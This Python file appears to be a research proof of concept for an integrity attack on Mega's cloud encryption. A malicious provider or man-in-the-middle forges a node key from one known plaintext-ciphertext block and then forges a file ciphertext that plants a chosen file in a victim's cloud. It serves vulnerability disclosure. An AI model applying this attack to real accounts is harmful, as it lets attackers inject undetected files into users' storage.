
#
# This file is part of the PoCs for various issues found in the cryptographic
# design of Mega.
#
# Content: PoC of the integrity attack on Mega in the MitM setting.
#

from issue_03.framing_attack import MegaFramingAttack

from shared.mega_simulation import *
from shared.attack_utils import *
from shared.constants.mega_crypto import *
from shared.constants.victim import *

class MegaIntegrityAttack():
    """
    ###########
    # Setting #
    ###########

    A malicious cloud provider or TLS-MitM adversary aims to place a malicious
    file in the victim's cloud.

    ##########
    # Attack #
    ##########

    The attack uses a single plaintext-ciphertext block (e.g., obtained from
    a publicly shared file) as node key.

    We first recover a file key, nonce, and metamac from the plaintext block.

    Then, we construct a file which produces this metamac by using the known
    key to compute the CBC-MAC forward resp. backward until the chunk in which
    we can insert 128 garbled bits. Afterwards, we do the same for the CBC-MAC
    of that chunk and insert the random 128 bits that ensure that the file
    produces the desired MetaMAC.

    Finaly, we encrypt the file using the node key.
    """

    def __init__(self):
        self.pt = None
        self.ct = None

        self.forged_file = None
        self.forged_obf_key_ct = None
        self.forged_obf_key_pt = None

    def parse_share_link(self, link):
        """
        Extract obfuscated key from share link and store it inside integrity
        attack object.

        :param link: share link
        """
        file_meta = link.split("/")[-1].split("#")
        self.share_handle = file_meta[0]

        # We only need one block
        self.set_known_pt(url_decode(file_meta[1]))

        print(f"Stored plaintext node key for file with handle: {self.share_handle}")
        return self.pt

    def set_known_pt(self, pt):
        """
        Feed in the known plaintext.
        """
        # We only need one block
        self.pt = pt[:AES_BLOCK_BYTE_SIZE]

    def set_known_ct(self, ct):
        """
        Feed in the known ciphertext (e.g., of the node key of a shared file).
        """
        # We only need one block
        self.ct = ct[:AES_BLOCK_BYTE_SIZE]

    def forge_node_key(self):
        """
        Forge a node key based on a known PT-CT pair.

        Because of the XOR structure of the obfuscated key, if we set the key
        ciphertext to
            ct || ct
        then the decryption parses as follows:
            - kF = ct XOR ct = "\x00" * 8
            - nF = ct[:8] (first half)
            - metamac = ct[8:] (second half)
        """

        if not self.pt or not self.ct:
            print("Need to set PT and CT first.")
            assert False

        self.forged_obf_key_ct = self.ct + self.ct
        self.forged_obf_key_pt = self.pt + self.pt

    def forge_file_ct(self, fname, garble_pos=None, add_attr={}):
        """
        Forge a file ciphertext (using the framing attack with the previously
        forged node key).

        :param fname: Name of the file for which we should forge a ciphertext
        :param garble_pos: AES block index where the file format tolerates 128
            bits of garbled data
        :param add_attr: Additional attributes that should be encrypted

        :returns: file content, file ciphertext, and the encrypted attributes
        """

        if not self.forged_obf_key_ct or not self.forged_obf_key_pt:
            print("Call forge_node_key first.")
            assert False

        attack = MegaFramingAttack()

        attack.set_node_key_ct(self.forged_obf_key_ct)
        attack.set_node_key_pt(self.forged_obf_key_pt)
        res = attack.forge_file_ct(fname, garble_pos, add_attr)

        # Propagate vars
        self.file_size = attack.file_size
        self.forged_file = attack.forged_file

        return res
